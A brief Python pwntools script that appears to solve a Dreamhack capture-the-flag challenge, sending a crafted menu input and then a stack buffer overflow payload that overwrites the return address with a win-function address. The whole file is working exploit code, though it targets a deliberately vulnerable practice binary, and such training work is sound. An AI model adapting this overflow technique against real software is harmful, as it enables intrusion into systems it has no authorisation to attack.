#!/usr/bin/env python3
from pwn import *

PORT =   10874
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x4013b7
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()
# GDB()
p.sendafter(b"Menu: ", b'cherry' + b'a'*6 + p8(0x99))

flag = 0x4012bc
p.sendafter(b': ', b'a'*0x1a + p64(flag))

p.interactive()